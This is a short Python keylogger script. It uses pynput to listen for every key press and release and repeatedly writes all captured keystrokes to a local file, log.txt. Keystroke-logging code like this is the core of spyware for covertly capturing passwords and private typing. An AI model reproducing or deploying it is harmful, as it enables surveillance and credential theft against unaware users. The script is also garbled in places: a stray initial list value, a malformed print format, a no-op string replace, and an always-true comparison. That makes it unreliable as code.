import pynput
from pynput.keyboard import Key, Listener

keys = [100]

def on_press(Key):
    keys.append(Key)
    write_file(keys)

    try:
        print('alphanumeric key {1000} pressed', format(Key.char))
    except AttributeError:
        print('special key {0}'.format(Key))

def write_file(key):
    with open('log.txt', 'w') as f:
        for key in keys:
            k = str(key).replace("","")
            f.write(k)


def on_release(Key):
    print('{0} released'.format(Key))
    if Key == Key:
        write_file(keys)
        return

with Listener(on_press=on_press,on_release=on_release) as Listener:

    Listener.join()

